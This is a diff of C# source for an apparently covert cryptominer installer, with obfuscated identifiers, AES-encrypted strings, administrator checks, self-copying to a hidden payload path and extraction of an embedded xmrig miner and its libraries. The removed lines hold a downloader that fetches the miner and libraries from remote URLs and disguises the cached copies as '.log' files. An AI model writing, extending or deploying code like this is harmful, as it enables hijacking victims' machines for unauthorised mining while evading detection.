@@ -48,7 +48,8 @@ public partial class RProgram
             string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
 #endif
 #if DefInstall
-            try{
+            try
+            {
                 string _rplp_ = PayloadPath;
 #if DefShellcode
                 string _rcmdl_ = Environment.GetCommandLineArgs()[1];
@@ -61,17 +62,6 @@ public partial class RProgram
 
                     try
                     {
-                        File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"));
-                    } 
-                    catch {}
-
-                    try
-                    {
-                        File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log"));
-                    } 
-                    catch {}
-
-                    try{
                         if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                         {
                             try{
@@ -95,7 +85,7 @@ public partial class RProgram
 
                     Thread.Sleep(10000);
                     Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
-                    File.WriteAllBytes(_rplp_, File.ReadAllBytes(_rcmdl_));
+                    File.Copy(_rcmdl_, _rplp_, true);
                     Thread.Sleep(2 * 1000);
                     _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
                     Environment.Exit(0);
@@ -164,39 +154,10 @@ public partial class RProgram
                     {
                         try
                         {
-                            byte[] li = {};
-#if DefDownloader
-                            if (!File.Exists(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log")))
-                            {
-                                using (var client = new System.Net.WebClient())
-                                {
-                                    try {
-                                        li = client.DownloadData(client.DownloadString(_rGetString_("#SANCTAMLIBSURL")));
-                                    }
-                                    catch(Exception ex){
-#if DefDebug
-                                        MessageBox.Show("M5.5: Couldn't get libs from sanctam, moving on to backup" + Environment.NewLine + ex.ToString());
-#endif
-                                    }
-                                    if (li.Length == 0) {
-                                        li = client.DownloadData(_rGetString_("#LIBSURL"));
-                                    }
-                                }
-#if DefInstall
-                                if (li.Length > 0) {
-                                    File.WriteAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log"), _rAESMethod_(li, true));
-                                }
-#endif
-                            }
-                            else
-                            {
-                                li = _rAESMethod_(File.ReadAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log")));
-                            }
-#else
-                            li = _rGetTheResource_("#libs");
-#endif
-                            if (li.Length > 0) {
-                                using (var _rarchive_ = new ZipArchive(new MemoryStream(li)))
+                            byte[] _li_ = _rGetTheResource_("#libs");
+
+                            if (_li_.Length > 0) {
+                                using (var _rarchive_ = new ZipArchive(new MemoryStream(_li_)))
                                 {
                                     foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries){
                                         _rentry_.ExtractToFile(Path.Combine(_rbD_, _rentry_.FullName), true);
@@ -227,47 +188,8 @@ public partial class RProgram
 #endif
                 }
 #endif
-                byte[] _rxm_ = { };
+                byte[] _rxm_ = _rGetTheResource_("#xmr");
 
-#if DefDownloader
-                try
-                {
-                    if (!File.Exists(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log")))
-                    {
-                        using (var client = new System.Net.WebClient())
-                        {
-                            try
-                            {
-                                _rxm_ = client.DownloadData(client.DownloadString(_rGetString_("#SANCTAMMINERURL")));
-                            }
-                            catch(Exception ex){
-#if DefDebug
-                                MessageBox.Show("M6.5: Couldn't get xmrig from sanctam, moving on to backup" + Environment.NewLine + ex.ToString());
-#endif
-                            }
-                            if (_rxm_.Length == 0) {
-                                _rxm_ = client.DownloadData(_rGetString_("#MINERURL"));
-                            }
-                        }
-#if DefInstall
-                        if (_rxm_.Length > 0) {
-                            File.WriteAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"), _rAESMethod_(_rxm_, true));
-                        }
-#endif
-                    }
-                    else
-                    {
-                        _rxm_ = _rAESMethod_(File.ReadAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log")));
-                    }
-                }
-                catch(Exception ex){
-#if DefDebug
-                    MessageBox.Show("MCDL: " + Environment.NewLine + ex.ToString());
-#endif
-                }
-#else
-                _rxm_ = _rGetTheResource_("#xmr");
-#endif
                 try
                 {
                     if (_rxm_.Length > 0)
@@ -323,7 +245,7 @@ public partial class RProgram
 
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
 
 #if DefGPU
